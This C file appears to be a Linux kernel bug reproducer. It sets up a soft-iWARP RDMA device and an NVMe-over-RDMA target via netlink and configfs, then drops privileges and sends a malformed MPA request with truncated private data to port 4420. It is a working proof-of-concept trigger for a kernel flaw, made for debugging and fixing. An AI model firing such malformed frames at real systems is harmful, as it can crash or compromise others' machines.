// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/if.h>
#include <linux/netlink.h>
#include <rdma/rdma_netlink.h>
#include <sched.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mount.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define TARGET_ADDR "10.0.2.15"
#define TARGET_BIND_ADDR "10.0.2.15"
#define TARGET_PORT 4420

static void die(const char *what)
{
	dprintf(2, "%s: %s\n", what, strerror(errno));
	exit(1);
}

static void mkdir_ok(const char *path)
{
	if (mkdir(path, 0755) && errno != EEXIST)
		die(path);
}

static void write_all(int fd, const void *buf, size_t len)
{
	const char *p = buf;

	while (len) {
		ssize_t n = write(fd, p, len);
		if (n < 0) {
			if (errno == EINTR)
				continue;
			die("write");
		}
		p += n;
		len -= n;
	}
}

static void write_file(const char *path, const char *value)
{
	int fd = open(path, O_WRONLY | O_CLOEXEC);

	if (fd < 0)
		die(path);
	write_all(fd, value, strlen(value));
	if (close(fd))
		die("close configfs attribute");
}

static void dump_file(const char *path)
{
	char buf[4096];
	int fd = open(path, O_RDONLY | O_CLOEXEC);
	ssize_t n;

	if (fd < 0)
		die(path);
	dprintf(1, "--- %s ---\n", path);
	while ((n = read(fd, buf, sizeof(buf))) > 0)
		write_all(STDOUT_FILENO, buf, n);
	if (n < 0)
		die("read diagnostic file");
	close(fd);
}

static void configure_eth0(void)
{
	int fd;
	struct ifreq ifr;
	struct sockaddr_in *sin;

	fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
	if (fd < 0)
		die("socket(AF_INET/SOCK_DGRAM)");

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, "eth0", IFNAMSIZ - 1);
	sin = (struct sockaddr_in *)&ifr.ifr_addr;
	sin->sin_family = AF_INET;
	if (inet_pton(AF_INET, TARGET_ADDR, &sin->sin_addr) != 1)
		die("inet_pton address");
	if (ioctl(fd, SIOCSIFADDR, &ifr))
		die("SIOCSIFADDR eth0");

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, "eth0", IFNAMSIZ - 1);
	sin = (struct sockaddr_in *)&ifr.ifr_netmask;
	sin->sin_family = AF_INET;
	if (inet_pton(AF_INET, "255.255.255.0", &sin->sin_addr) != 1)
		die("inet_pton netmask");
	if (ioctl(fd, SIOCSIFNETMASK, &ifr))
		die("SIOCSIFNETMASK eth0");

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, "eth0", IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFFLAGS, &ifr))
		die("SIOCGIFFLAGS eth0");
	ifr.ifr_flags |= IFF_UP;
	if (ioctl(fd, SIOCSIFFLAGS, &ifr))
		die("SIOCSIFFLAGS eth0");
	close(fd);
}

static void nl_add_string(struct nlmsghdr *nlh, size_t maxlen,
			  unsigned short type, const char *s)
{
	size_t len = strlen(s) + 1;
	size_t oldlen = NLMSG_ALIGN(nlh->nlmsg_len);
	size_t attrlen = NLA_HDRLEN + len;
	struct nlattr *nla;

	if (oldlen + NLA_ALIGN(attrlen) > maxlen) {
		errno = E2BIG;
		die("netlink message overflow");
	}
	nla = (struct nlattr *)((char *)nlh + oldlen);
	nla->nla_type = type;
	nla->nla_len = attrlen;
	memcpy((char *)nla + NLA_HDRLEN, s, len);
	memset((char *)nla + attrlen, 0, NLA_ALIGN(attrlen) - attrlen);
	nlh->nlmsg_len = oldlen + NLA_ALIGN(attrlen);
}

static void create_siw_device(void)
{
	char buf[512];
	char reply[8192];
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	struct sockaddr_nl kernel = { .nl_family = AF_NETLINK };
	struct sockaddr_nl local = { .nl_family = AF_NETLINK };
	int fd;
	ssize_t n;

	fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_RDMA);
	if (fd < 0)
		die("socket(NETLINK_RDMA)");
	if (bind(fd, (struct sockaddr *)&local, sizeof(local)))
		die("bind(NETLINK_RDMA)");

	memset(buf, 0, sizeof(buf));
	nlh->nlmsg_len = NLMSG_LENGTH(0);
	nlh->nlmsg_type = RDMA_NL_GET_TYPE(RDMA_NL_NLDEV,
					      RDMA_NLDEV_CMD_NEWLINK);
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq = 1;
	nl_add_string(nlh, sizeof(buf), RDMA_NLDEV_ATTR_DEV_NAME, "siw0");
	nl_add_string(nlh, sizeof(buf), RDMA_NLDEV_ATTR_LINK_TYPE, "siw");
	nl_add_string(nlh, sizeof(buf), RDMA_NLDEV_ATTR_NDEV_NAME, "eth0");

	if (sendto(fd, buf, nlh->nlmsg_len, 0,
		   (struct sockaddr *)&kernel, sizeof(kernel)) < 0)
		die("sendto(RDMA_NLDEV_CMD_NEWLINK)");
	n = recv(fd, reply, sizeof(reply), 0);
	if (n < 0)
		die("recv(RDMA_NLDEV_CMD_NEWLINK)");

	for (nlh = (struct nlmsghdr *)reply; NLMSG_OK(nlh, n);
	     nlh = NLMSG_NEXT(nlh, n)) {
		if (nlh->nlmsg_type == NLMSG_ERROR) {
			struct nlmsgerr *e = NLMSG_DATA(nlh);
			if (e->error) {
				errno = -e->error;
				die("RDMA_NLDEV_CMD_NEWLINK");
			}
			close(fd);
			return;
		}
	}
	errno = EPROTO;
	die("missing RDMA netlink acknowledgement");
}

static void configure_nvmet(void)
{
	const char *base = "/sys/kernel/config";
	const char *subsys = "/sys/kernel/config/nvmet/subsystems/poc";
	const char *port = "/sys/kernel/config/nvmet/ports/1";

	mkdir_ok(base);
	if (mount("configfs", base, "configfs", 0, NULL) && errno != EBUSY)
		die("mount(configfs)");

	mkdir_ok(subsys);
	write_file("/sys/kernel/config/nvmet/subsystems/poc/attr_allow_any_host",
		   "1\n");
	mkdir_ok(port);
	write_file("/sys/kernel/config/nvmet/ports/1/addr_adrfam", "ipv4\n");
	write_file("/sys/kernel/config/nvmet/ports/1/addr_trtype", "rdma\n");
	write_file("/sys/kernel/config/nvmet/ports/1/addr_traddr",
		   TARGET_BIND_ADDR "\n");
	write_file("/sys/kernel/config/nvmet/ports/1/addr_trsvcid", "4420\n");

	if (symlink(subsys,
		    "/sys/kernel/config/nvmet/ports/1/subsystems/poc") &&
	    errno != EEXIST)
		die("link subsystem to nvmet-rdma port");
}

static void enable_debug(void)
{
	write_file("/proc/sys/kernel/printk", "8 4 1 7\n");
	mkdir_ok("/sys/kernel/debug");
	if (mount("debugfs", "/sys/kernel/debug", "debugfs", 0, NULL) &&
	    errno != EBUSY)
		die("mount(debugfs)");
	write_file("/sys/kernel/debug/dynamic_debug/control",
		   "file siw_cm.c +p\n");
	write_file("/sys/kernel/debug/dynamic_debug/control",
		   "file cma.c +p\n");
	write_file("/sys/kernel/debug/dynamic_debug/control",
		   "module nvmet_rdma +p\n");
}

static void trigger_short_mpa_private_data(void)
{
	struct __attribute__((packed)) {
		char key[16];
		uint16_t bits;
		uint16_t pd_len;
		unsigned char private_data[6];
	} req;
	struct sockaddr_in dst;
	int fd, i;

	memset(&dst, 0, sizeof(dst));
	dst.sin_family = AF_INET;
	dst.sin_port = htons(TARGET_PORT);
	if (inet_pton(AF_INET, TARGET_ADDR, &dst.sin_addr) != 1)
		die("inet_pton trigger");
	for (i = 0; i < 20; i++) {
		fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
		if (fd < 0)
			die("socket trigger");
		if (!connect(fd, (struct sockaddr *)&dst, sizeof(dst)))
			break;
		close(fd);
		usleep(100000);
	}
	if (i == 20)
		die("connect nvmet-rdma");

	memset(&req, 0, sizeof(req));
	memcpy(req.key, "MPA ID Req Frame", sizeof(req.key));
	req.bits = htons(1);
	req.pd_len = htons(6);

	req.private_data[2] = 1;
	req.private_data[4] = 1;
	write_all(fd, &req, sizeof(req));

	dprintf(1, "sent %zu-byte MPA request with 6-byte NVMe/RDMA private data\n",
		sizeof(req));
	sleep(10);
	close(fd);
}

int main(void)
{
	enable_debug();
	configure_eth0();
	create_siw_device();
	sleep(1);
	dump_file("/sys/class/infiniband/siw0/node_type");
	configure_nvmet();
	sleep(2);
	dump_file("/sys/kernel/config/nvmet/ports/1/addr_trsvcid");
	dump_file("/proc/net/tcp");

	if (setgid(65534) || setuid(65534))
		die("drop privileges");
	trigger_short_mpa_private_data();
	return 0;
}
